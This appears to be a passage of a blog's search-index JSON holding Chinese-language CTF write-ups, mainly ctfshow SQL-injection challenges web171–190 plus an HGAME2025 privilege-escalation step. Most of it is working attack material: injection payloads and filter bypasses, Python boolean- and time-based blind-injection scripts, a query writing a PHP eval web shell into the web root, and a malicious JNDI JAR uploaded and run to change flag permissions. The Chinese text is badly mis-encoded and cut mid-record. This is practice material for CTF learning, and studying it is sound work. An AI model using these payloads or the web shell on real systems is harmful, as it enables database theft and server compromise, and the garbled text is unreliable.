æ¶æ„ldapæœåŠ¡å™¨åˆ©â½¤æœ¬åœ°javaåº”â½¤ææƒ\næˆ‘å’‹çŸ¥é“æœ¬åœ°æœ‰Javaç¯å¢ƒå‘¢ï¼Ÿfindä¸€ä¸‹å°±å¥½\nfind / -name \u0026#34;java\u0026#34; 2\u0026gt;/dev/null ä¸Šä¼ æ¶æ„ JAR åŒ…\nscp -i /root/.ssh/id_rsa -P 31266 ./JNDIMap-0.0.1.jar mysid@node1.hgame.vidar.club:/tmp /usr/local/openjdk-8/bin/java -jar /tmp/JNDIMap-0.0.1.jar -i 127.0.0.1 -l 389 -u \u0026#34;/Deserialize/Jackson/Command/Y2htb2QgNzc3IC9mbGFn\u0026#34; è§¦å‘æ¼æ´\ncurl -X POST -d \u0026#34;baseDN=a/b\u0026amp;filter=a\u0026#34; http://127.0.0.1:8080/search æˆåŠŸæ‰§è¡Œ\n","permalink":"http://localhost:1313/post/hgame2025/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003eæ‹¿åˆ°ç¯å¢ƒ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\u003c/p\u003e\n\u003cp\u003eå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025-Web-Writeup"},{"content":"æ— è¿‡æ»¤æ³¨å…¥ï¼ˆå¯¹è¾“å‡ºå†…å®¹è¿›è¡Œè¿‡æ»¤ï¼‰ web171 $sql = \u0026#34;select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; limit 1;\u0026#34;; flagæ˜¯å­˜åœ¨äºusernameä¸ºflagçš„ç”¨æˆ·çš„æ•°æ®ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡\n1\u0026#39; or 1=1 --+ å³å¯è¾“å‡ºæ‰€æœ‰ç”¨æˆ·æ•°æ®\nweb172 ç›¸æ¯”ä¸Šä¸€é¢˜ï¼Œè¿™é¢˜å¢åŠ äº†è¿‡æ»¤\n//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag\rif($row-\u0026gt;username!==\u0026#39;flag\u0026#39;){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;æŸ¥è¯¢æˆåŠŸ\u0026#39;;\r} æ–¹æ³•ä¸€: è”åˆæŸ¥è¯¢\nå› ä¸ºè”åˆæŸ¥è¯¢åªä¼šæ˜¾ç¤ºpassword\napi/?id=1\u0026#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23\r/api/?id=1\u0026#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;ctfshow_web\u0026#39;),database()%23\r/api/?id=1\u0026#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;ctfshow_web\u0026#39; and table_name=\u0026#39;ctfshow_user\u0026#39;),database()%23\r//çœ‹åˆ°æœ‰3åˆ— id,username,password\r/api/?id=1\u0026#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23\r//æŸ¥è¯¢passwordå‘ç°æ²¡æœ‰flag\r//æŸ¥å¦ä¸€ä¸ªè¡¨ ctfshow_user2\r/api/?id=1\u0026#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23\r//çœ‹åˆ°flag æ–¹æ³•äºŒ: å°†ç”¨æˆ·åå­—æ®µè¿›è¡Œç¼–ç ï¼Œç»•è¿‡æ£€æµ‹\n-1\u0026#39; union select to_base64(username),password from ctfshow_user2 --+ æ–¹æ³•ä¸‰: åªæŸ¥è¯¢å¯†ç \n-1\u0026#39; union select id,password from ctfshow_user2 where username=\u0026#39;flag web173 è¿‡æ»¤è¦æ±‚æŸ¥è¯¢ç»“æœä¸­ä¸èƒ½å‡ºç°flagå­—æ®µ\n//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag\rif(!preg_match(\u0026#39;/flag/i\u0026#39;, json_encode($ret))){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;æŸ¥è¯¢æˆåŠŸ\u0026#39;;\r} æ–¹æ³•ä¸€ï¼šè”åˆæŸ¥è¯¢\nå’Œä¸Šé¢˜è§£æ³•ä¸€æ ·ï¼Œåªæ˜¯è¿™é¢˜flagåœ¨ctfshow_user3\næ–¹æ³•äºŒï¼š\nåªæŸ¥è¯¢password\n-1\u0026#39; union select id,id,password from ctfshow_user3 where username=\u0026#39;flag æ–¹æ³•ä¸‰: å°†ç”¨æˆ·åå­—æ®µè¿›è¡Œç¼–ç ï¼Œç»•è¿‡æ£€æµ‹\n-1\u0026#39; union select to_base64(username),password from ctfshow_user3 --+ web174 è¾“å‡ºæ—¶å¢åŠ äº†è¿‡æ»¤æ•°å­—\n//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flagå’Œæ•°å­—\rif(!preg_match(\u0026#39;/flag|[0-9]/i\u0026#39;, json_encode($ret))){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;æŸ¥è¯¢æˆåŠŸ\u0026#39;;\r} ç”±äºflagä¸­å«æœ‰æ•°å­—ï¼Œå“ªæ€•åƒä¹‹å‰çš„é€šè¿‡to_base64ç­‰ç¼–ç åï¼Œä»ç„¶ä¸å¯é¿å…æ•°å­—çš„å‡ºç°\næ‰€ä»¥è¿™é¢˜æˆ‘ä»¬è¦ç”¨åˆ°å¸ƒå°”ç›²æ³¨\næ”¾ä¸ªè„šæœ¬\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1\u0026#39; and \u0026#34; 5 6result = \u0026#39;\u0026#39; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 payload = f\u0026#39;1=if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))\u0026gt;{mid},1,0) -- -\u0026#39; 17 r = requests.get(url + payload) 18 if \u0026#34;admin\u0026#34; in r.text: 19 head = mid + 1 20 else: 21 tail = mid 22 23 if head != 32: 24 result += chr(head) 25 else: 26 break 27 print(result) åˆæˆ–è€…é€šè¿‡replaceæ–¹æ³•å°†æ•°å­—æ›¿æ¢æˆå…¶ä»–çš„åˆæ³•å­—ç¬¦\n1\u0026#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,\u0026#39;A\u0026#39;),2,\u0026#39;B\u0026#39;),3,\u0026#39;C\u0026#39;),4,\u0026#39;D\u0026#39;),5,\u0026#39;E\u0026#39;),6,\u0026#39;F\u0026#39;),7,\u0026#39;G\u0026#39;),8,\u0026#39;H\u0026#39;),9,\u0026#39;I\u0026#39;),0,\u0026#39;J\u0026#39;),\u0026#39;b\u0026#39; from ctfshow_user4 where username=\u0026#39;flag\u0026#39; %23 æ‹¿åˆ°flagåæ›¿æ¢å›å»å°±è¡Œ\n1import base64 2 3flag64 = \u0026#34;ctfshow{GHIeaIeG-AGaG-DAab-HHae-eEaFcHFIEbef}\u0026#34; 4 5flag = flag64.replace(\u0026#34;A\u0026#34;, \u0026#34;1\u0026#34;).replace(\u0026#34;B\u0026#34;, \u0026#34;2\u0026#34;).replace(\u0026#34;C\u0026#34;, \u0026#34;3\u0026#34;).replace(\u0026#34;D\u0026#34;, \u0026#34;4\u0026#34;).replace(\u0026#34;E\u0026#34;, \u0026#34;5\u0026#34;).replace(\u0026#34;F\u0026#34;, \u0026#34;6\u0026#34;).replace(\u0026#34;G\u0026#34;, \u0026#34;7\u0026#34;).replace(\u0026#34;H\u0026#34;, \u0026#34;8\u0026#34;).replace(\u0026#34;I\u0026#34;, \u0026#34;9\u0026#34;).replace(\u0026#34;J\u0026#34;, \u0026#34;0\u0026#34;) 6 7print(flag) åˆæˆ–è€…\n1\u0026#39; union select 1,\u0026#34;\u0026lt;?=eval($_POST[1]);?\u0026gt;\u0026#34; into outfile \u0026#34;/var/www/html/shell.php\u0026#34; --+ web175 //æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag\rif(!preg_match(\u0026#39;/[\\x00-\\x7f]/i\u0026#39;, json_encode($ret))){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;æŸ¥è¯¢æˆåŠŸ\u0026#39;;\r}\ræ£€æŸ¥å˜é‡ $ret ç»è¿‡ json_encode ç¼–ç åçš„ç»“æœä¸­æ˜¯å¦åªåŒ…å« ASCII å­—ç¬¦ï¼ˆå³å­—ç¬¦ç¼–ç èŒƒå›´åœ¨ \\x00 åˆ° \\x7f ä¹‹é—´ï¼‰ã€‚å¦‚æœä¸æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œå°±å°† $ret æ•°ç»„ä¸­çš„ msg é”®çš„å€¼è®¾ç½®ä¸º 'æŸ¥è¯¢æˆåŠŸ'ã€‚\nä¹Ÿå°±æ˜¯æ²¡æœ‰ä»»ä½•å›æ˜¾\næ–¹æ³•ä¸€ï¼šæ—¶é—´ç›²æ³¨\nå¤§ä½¬çš„è„šæœ¬ï¼Œç”¨çš„äºŒåˆ†æ³•\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1\u0026#39; and \u0026#34; 5 6result = \u0026#39;\u0026#39; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 payload = f\u0026#39;1=if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))\u0026gt;{mid},sleep(2),0) -- -\u0026#39; 17 try: 18 r = requests.get(url + payload, timeout=0.5) 19 tail = mid 20 except Exception as e: 21 head = mid + 1 22 23 if head != 32: 24 result += chr(head) 25 else: 26 break 27 print(result) æ–¹æ³•äºŒ:åˆ©ç”¨è¯»å†™æ–‡ä»¶å†™å…¥ç½‘ç«™æ ¹ç›®å½• http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/api/v5.php?id=1' union select 1,password from ctfshow_user5 into outfile \u0026lsquo;/var/www/html/1.txt\u0026rsquo;\u0026ndash;+\u0026amp;page=1\u0026amp;limit=10 ä¹‹åè®¿é—®http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/1.txt\nè¿‡æ»¤æ³¨å…¥ï¼ˆå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰ web176 //å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤\rfunction waf($str){\r//ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º\r} æ–¹æ³•ä¸€ï¼šä¸‡èƒ½é’¥åŒ™\n1\u0026#39; or 1=1--+ èƒ½æ‰¾åˆ°flag\næ–¹æ³•äºŒ:å¤§å°å†™ç»•è¿‡\n1\u0026#39; uNion sElect 1,2,password from ctfshow_user --+ web177 é»‘åå•ï¼šç©ºæ ¼ã€+\nç©ºæ ¼æ›¿ä»£ï¼š%20ï¼ˆæ™®é€šç©ºæ ¼ï¼‰ã€%09ï¼ˆæ°´å¹³åˆ¶è¡¨ç¬¦ï¼‰ã€%0aï¼ˆæ¢è¡Œç¬¦ï¼‰ã€%0bï¼ˆå›è½¦ç¬¦ï¼‰ã€%0cï¼ˆæ–°ä¸€é¡µï¼‰ã€%0dï¼ˆå‚ç›´åˆ¶è¡¨ç¬¦ï¼‰ã€%a0ã€()ã€``ã€\\**\\\nå¯ä»¥ç”¨\\**\\ç»•è¿‡\n1\u0026#39;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=\u0026#39;flag\u0026#39;%23 æ–¹æ³•äºŒ:ä¸‡èƒ½é’¥åŒ™\nweb178 é»‘åå•å¢åŠ ï¼š%20ã€*\n1\u0026#39;%09union%09select%09password,1,1%09from%09ctfshow_user%09where%09username%09=\u0026#39;flag\u0026#39;%23 æ–¹æ³•äºŒ:ä¸‡èƒ½é’¥åŒ™\nweb179 é»‘åå•å¢åŠ ï¼š%09ã€%0aã€%0bã€%0d\nè¿™é¢˜æŠŠ%09ä¹Ÿè¿‡æ»¤äº†ï¼Œè¿™é¢˜ç©ºæ ¼å¯ä»¥ç”¨%0cç»•è¿‡\n1\u0026#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23 web180 é»‘åå•å¢åŠ ï¼š#\nå¯ä»¥ç”¨\u0026ndash;%0cä»£æ›¿#(%23)\n1\u0026#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c æˆ–è€…ç›´æ¥ä¸‡èƒ½å¯†ç \nid=-1\u0026#39;or(id=26)and\u0026#39;1\u0026#39;=\u0026#39;1 web181 1//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ 2 function waf($str){ 3 return preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i\u0026#39;, $str); 4 } / å’Œ /iï¼šæ­£åˆ™è¡¨è¾¾å¼çš„å®šç•Œç¬¦ï¼Œ/ è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸï¼Œi æ˜¯ä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™è¿›è¡ŒåŒ¹é…ã€‚\n|\\*ï¼šåŒ¹é…ç©ºæ ¼å­—ç¬¦ï¼ˆï¼‰å’Œæ˜Ÿå·ï¼ˆ*ï¼‰ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦åœ¨ SQL æ³¨å…¥ä¸­å¯èƒ½ä¼šè¢«ç”¨äºæ„é€ æ¶æ„è¯­å¥ã€‚\n\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0\nï¼šåˆ†åˆ«åŒ¹é…ä¸åŒçš„ ASCII æ§åˆ¶å­—ç¬¦å’Œç‰¹æ®Šç©ºç™½å­—ç¬¦ï¼Œä¾‹å¦‚ï¼š\n\\x09ï¼šæ°´å¹³åˆ¶è¡¨ç¬¦ï¼ˆTabï¼‰ \\x0aï¼šæ¢è¡Œç¬¦ï¼ˆLFï¼‰ \\x0bï¼šå‚ç›´åˆ¶è¡¨ç¬¦ \\x0cï¼šæ¢é¡µç¬¦ \\x00ï¼šç©ºå­—ç¬¦ \\x0dï¼šå›è½¦ç¬¦ï¼ˆCRï¼‰ \\xa0ï¼šä¸é—´æ–­ç©ºæ ¼ \\x23|\\#ï¼šåŒ¹é…äº•å·ï¼ˆ#ï¼‰ï¼Œåœ¨ SQL ä¸­ï¼Œ# é€šå¸¸ç”¨äºæ³¨é‡Šï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨æ³¨é‡Šæ¥ç»•è¿‡ SQL è¯­å¥çš„æ£€æŸ¥ã€‚\nfile|into|selectï¼šåŒ¹é…å…³é”®å­— fileã€into å’Œ selectï¼Œè¿™äº›å…³é”®å­—åœ¨ SQL æ³¨å…¥å’Œæ–‡ä»¶åŒ…å«æ”»å‡»ä¸­ç»å¸¸è¢«ä½¿ç”¨ã€‚\næ–¹æ³•ä¸€ ç”¨likeæ¥åŒ¹é…å…³é”®è¯flag\n-1\u0026#39;%0cor%0cusername%0clike%0c\u0026#39;flag æ–¹æ³•äºŒ\n-1\u0026#39;or(id=26)and\u0026#39;1 çœ‹åˆ°ä¸€ç¯‡å¤§ä½¬çš„æ–‡ç« ï¼Œæ„Ÿè§‰æ˜äº†ä¸å°‘\nctfshow Webå…¥é—¨SQLæ³¨å…¥ web171-197 Writeup - X1r0z Blog\nweb182 1//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ 2 function waf($str){ 3 return preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select|flag/i\u0026#39;, $str); 4 } é»‘åå•å¢åŠ ï¼šflag\nè¿™é¢˜å¯ä»¥ç”¨åˆ°likeè¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢\npayload:\n-1\u0026#39;or%0cusername%0clike%0c\u0026#39;fl% æˆ–è€…ç»§ç»­ä½¿ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•äºŒ\nweb183 æŸ¥è¯¢è¯­å¥\n//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select count(pass) from \u0026#34;.$_POST[\u0026#39;tableName\u0026#39;].\u0026#34;;\u0026#34;; è¿”å›é€»è¾‘\n//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤\rfunction waf($str){\rreturn preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i\u0026#39;, $str);\r} æŸ¥è¯¢ç»“æœ\n//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°\r$user_count = 0; é¢˜ç›®å¤§æ¦‚çš„æ„æ€å°±æ˜¯æˆ‘ä»¬ä¼ å…¥è¡¨åè¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœè¡¨åæ­£ç¡®ï¼Œå°±ä¼šè¿”å›ç”¨æˆ·è¡¨è®°å½•æ€»æ•°1ï¼Œå¦‚æœè¡¨åé”™è¯¯åˆ™è¿”å›0ï¼Œä¸”æ¯æ¬¡æœ€å¤šåªä¼šè¿”å›1ï¼Œæ ¹æ®è¿™ä¸ªæˆ‘ä»¬å¯ä»¥å°è¯•å¸ƒå°”ç›²æ³¨ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“è¡¨å(ctfshow_user)å’Œåˆ—å(pass)ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡å¸ƒå°”ç›²æ³¨æ‹¿åˆ°flag\nY4tackerå¤§ä½¬çš„è„šæœ¬\nimport requests\rurl = \u0026#39;http://ee0ad3ab-e8f0-4183-97a8-aa3c5bcbe4f4.challenge.ctf.show/select-waf.php\u0026#39;\rstr = r\u0026#34;{abcdefghijklmnopqrstuvwsyz-0123456789}\u0026#34;\rflag = \u0026#34;\u0026#34;\rindex = 0\rwhile True:\rfor i in str:\rdata = {\r\u0026#39;tableName\u0026#39;: f\u0026#34;(ctfshow_user)where(substr(pass,{index},1))regexp(\u0026#39;{i}\u0026#39;)\u0026#34;\r}\rr = requests.post(url, data=data)\rif r.text.find(\u0026#34;$user_count = 1;\u0026#34;) \u0026gt; 0:\rflag += i\rprint(flag)\rbreak\rindex += 1 ä¸æ˜¯ä¸ºä»€ä¹ˆæˆ‘flagçš„é©¬ç”²æ˜¯è¿™æ ·çš„\nweb184 1//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ 2 function waf($str){ 3 return preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str); 4 } å› ä¸ºè¿™é¢˜whereè¢«banäº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨right joinè¿›è¡Œä»£æ›¿\nä¾æ—§æ˜¯å¸ƒå°”ç›²æ³¨\nPOC\nimport requests\rurl = \u0026#39;http://effed757-6639-46a9-9103-22fedb04bb41.challenge.ctf.show/select-waf.php\u0026#39;\rcharset = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}\u0026#39;\rflag = \u0026#39;\u0026#39;\rfor i in range(1, 50): # å‡è®¾ flag æœ€é•¿ 50 ä¸ªå­—ç¬¦\rfor j in charset:\rpayload = f\u0026#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1) regexp char({ord(j)}))\u0026#34;\rdata = {\r\u0026#39;tableName\u0026#39;: payload\r}\rresponse = requests.post(url, data=data)\rif \u0026#34;some_success_condition\u0026#34; in response.text:\rflag += j\rprint(flag)\rbreak web185 //å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤\rfunction waf($str){\rreturn preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str);\r} è¿™é¢˜æŠŠæ•°å­—banæ‰äº†\nè¿™å…¶å®å°±å¯¼è‡´äº†æˆ‘ä»¬åœ¨æ„é€ payloadçš„æ—¶å€™æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨æ•°å­—\nä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨trueæ¥ä»£æ›¿æ„é€ å‡ºæ•°å­—\næˆ‘ä»¬çŸ¥é“true = 1\né‚£2å°±å¯ä»¥ç”¨true+trueæ¥è¡¨ç¤ºï¼Œä»¥æ­¤ç±»æ¨\n1import requests 2url = \u0026#34;http://33578c7b-f34a-422b-87a5-a8accac68645.challenge.ctf.show/select-waf.php\u0026#34; 3flag = \u0026#39;\u0026#39; 4 5 6def createNum(n): 7 num = \u0026#39;true\u0026#39; 8 if n == 1: 9 return \u0026#39;true\u0026#39; 10 else: 11 for i in range(n - 1): 12 num += \u0026#34;+true\u0026#34; 13 return num 14 15 16for i in range(45): 17 if i \u0026lt;= 5: 18 continue 19 for j in range(127): 20 data = { 21 \u0026#34;tableName\u0026#34;: f\u0026#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{createNum(i)},{createNum(1)})regexp(char({createNum(j)})))\u0026#34; 22 } 23 r = requests.post(url, data=data) 24 if r.text.find(\u0026#34;$user_count = 43;\u0026#34;) \u0026gt; 0: 25 if chr(j) != \u0026#34;.\u0026#34;: 26 flag += chr(j) 27 28 print(\u0026#34;[*]result is:\u0026#34;+flag.lower()) 29 if chr(j) == \u0026#34;}\u0026#34;: 30 exit(0) 31 break web186 //å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤\rfunction waf($str){\rreturn preg_match(\u0026#39;/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\\u0026lt;|\\\u0026gt;|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#39;|\\\u0026#34;|union|\\`|sleep|benchmark/i\u0026#39;, $str);\r} è§£æ³•å’Œä¸Šé¢˜ä¸€æ ·\nweb187 è¿”å›é€»è¾‘\r$username = $_POST[\u0026#39;username\u0026#39;];\r$password = md5($_POST[\u0026#39;password\u0026#39;],true);\r//åªæœ‰adminå¯ä»¥è·å¾—flag\rif($username!=\u0026#39;admin\u0026#39;){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç”¨æˆ·åä¸å­˜åœ¨\u0026#39;;\rdie(json_encode($ret));\r}\rpassword=md5($pass,true)ç»•è¿‡ã€å¼±ç±»å‹ã€MD5å¼ºç¢°æ’_select * from \u0026lsquo;admin\u0026rsquo; where password=md5($pass,tru-CSDNåšå®¢\npayload:\nadmin/ffifdyop æŠ“ä¸ªåŒ…\nweb188 æŸ¥è¯¢è¯­å¥\r//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select pass from ctfshow_user where username = {$username}\u0026#34;; è¿”å›é€»è¾‘\r//ç”¨æˆ·åæ£€æµ‹\rif(preg_match(\u0026#39;/and|or|select|from|where|union|join|sleep|benchmark|,|\\(|\\)|\\\u0026#39;|\\\u0026#34;/i\u0026#39;, $username)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç”¨æˆ·åéæ³•\u0026#39;;\rdie(json_encode($ret));\r}\r//å¯†ç æ£€æµ‹\rif(!is_numeric($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;å¯†ç åªèƒ½ä¸ºæ•°å­—\u0026#39;;\rdie(json_encode($ret));\r}\r//å¯†ç åˆ¤æ–­\rif($row[\u0026#39;pass\u0026#39;]==intval($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;;\rarray_push($ret[\u0026#39;data\u0026#39;], array(\u0026#39;flag\u0026#39;=\u0026gt;$flag));\r}\rctfshow-sqlæ³¨å…¥-è¶…è¯¦è§£(172-200)_ctfshow 172-CSDNåšå®¢\næ‰€ä»¥payloadä¸º\n0/0\ræˆ–è€…\r1||1/0 https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v\nweb189 //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select pass from ctfshow_user where username = {$username}\u0026#34;; //ç”¨æˆ·åæ£€æµ‹\rif(preg_match(\u0026#39;/select|and| |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleep|benchmark/i\u0026#39;, $username)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç”¨æˆ·åéæ³•\u0026#39;;\rdie(json_encode($ret));\r}\r//å¯†ç æ£€æµ‹\rif(!is_numeric($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;å¯†ç åªèƒ½ä¸ºæ•°å­—\u0026#39;;\rdie(json_encode($ret));\r}\r//å¯†ç åˆ¤æ–­\rif($row[\u0026#39;pass\u0026#39;]==$password){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;ç™»é™†æˆåŠŸ\u0026#39;;\r}\rè¿™é¢˜åœ¨è¾“å…¥0/0çš„æ—¶å€™ä¼šæ˜¾ç¤ºå¯†ç é”™è¯¯ï¼Œè€Œåœ¨è¾“å…¥1/0çš„æ—¶å€™åˆ™ä¼šæ˜¾ç¤ºæŸ¥è¯¢é”™è¯¯\nå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼Œå³æ­£ç¡®æ—¶ç³»ç»Ÿè¿”å›æŸ¥è¯¢é”™è¯¯ï¼Œé”™è¯¯æ—¶ç³»ç»Ÿè¿”å›å¯†ç é”™è¯¯\n1# -*- coding: utf-8 -*- 2# @Author : Yn8rt 3# @Time : 2021/7/30 15:48 4# @Function: 5import requests 6import sys 7import json 8 9url = \u0026#39;http://98e1809d-5de9-4f68-b45f-d03388b1dae8.challenge.ctf.show/api/\u0026#39; 10flag = \u0026#39;ctfshow{\u0026#39; 11letter = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyz-{}\u0026#39; 12 13for i in range(100): 14 for j in letter: 15 payload = { 16 \u0026#34;username\u0026#34;: \u0026#34;if(load_file(\u0026#39;/var/www/html/api/index.php\u0026#39;)regexp(\u0026#39;{}\u0026#39;),0,1)\u0026#34;.format(flag + j), 17 \u0026#34;password\u0026#34;: \u0026#34;0\u0026#34; 18 19 } 20 r = requests.post(url=url,data=payload) 21 #print(r) 22 if \u0026#34;å¯†ç é”™è¯¯\u0026#34; == r.json()[\u0026#39;msg\u0026#39;]: 23 flag += j 24 print(flag) 25 break 26 if \u0026#39;}\u0026#39; in flag: 27 sys.exit() web190 æŸ¥è¯¢è¯­å¥\n//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·\r$sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;;\rè¿”å›é€»è¾‘\n//å¯†ç æ£€æµ‹\rif(!is_numeric($password)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;å¯†ç åªèƒ½ä¸ºæ•°å­—\u0026#39;;\rdie(json_encode($ret));\r}\r//å¯†ç 